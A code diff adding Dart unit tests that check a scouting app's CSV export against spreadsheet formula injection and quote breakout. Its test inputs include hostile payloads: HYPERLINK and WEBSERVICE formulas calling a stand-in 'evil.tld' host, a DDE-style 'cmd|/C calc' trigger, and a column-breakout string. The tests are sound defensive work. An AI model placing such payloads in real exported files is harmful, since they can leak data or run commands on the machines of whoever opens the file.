@@ -173,5 +173,61 @@ void main() {
       expect(csv, contains('plain comment'));
       expect(csv, isNot(contains('"plain comment"')));
     });
+
+    // --- Formula injection (security review 2026-07-28) ---
+    //
+    // Quoting alone does not stop evaluation: Excel/Sheets/LibreOffice run a
+    // leading `=` even inside a quoted field. Scout-supplied comments and
+    // scouter names reach this sink and are opened by a teammate.
+
+    test('neutralizes a leading = in comments', () {
+      final csv = ExportService.buildCsvString([
+        _frcMatch(comments: '=HYPERLINK("https://evil.tld","click")'),
+      ]);
+      expect(csv, isNot(contains(',=HYPERLINK')));
+      expect(csv, isNot(contains('"=HYPERLINK')));
+      expect(csv, contains("'=HYPERLINK"));
+    });
+
+    test('neutralizes leading +, -, and @ in comments', () {
+      for (final trigger in ['+', '-', '@']) {
+        final csv = ExportService.buildCsvString([
+          _frcMatch(comments: '${trigger}cmd|/C calc!A0'),
+        ]);
+        expect(csv, contains("'$trigger"),
+            reason: 'leading $trigger should be guarded');
+      }
+    });
+
+    test('neutralizes a leading = in scouterName', () {
+      final csv = ExportService.buildCsvString([
+        _frcMatch(scouter: '=WEBSERVICE("https://evil.tld")'),
+      ]);
+      expect(csv, contains("'=WEBSERVICE"));
+    });
+
+    // The breakout half of the same bug: a quote inside a quoted field must be
+    // doubled, or the field terminates early and the rest becomes new columns.
+    test('a quote-and-comma payload cannot break out into extra columns', () {
+      final csv = ExportService.buildCsvString([
+        _frcMatch(comments: 'ok","=1+1","x'),
+      ]);
+      // Every embedded quote doubled, so nothing escapes the field.
+      expect(csv, contains('"ok"",""=1+1"",""x"'));
+      expect(csv.trim().split('\n').length, 2); // header + exactly one row
+    });
+
+    test('does not disturb a comment that merely contains = later on', () {
+      final csv = ExportService.buildCsvString([
+        _frcMatch(comments: 'score = 12'),
+      ]);
+      expect(csv, contains('score = 12'));
+      expect(csv, isNot(contains("'score")));
+    });
+
+    test('leaves an empty comment empty', () {
+      final csv = ExportService.buildCsvString([_frcMatch(comments: '')]);
+      expect(csv, isNot(contains("'")));
+    });
   });
 }
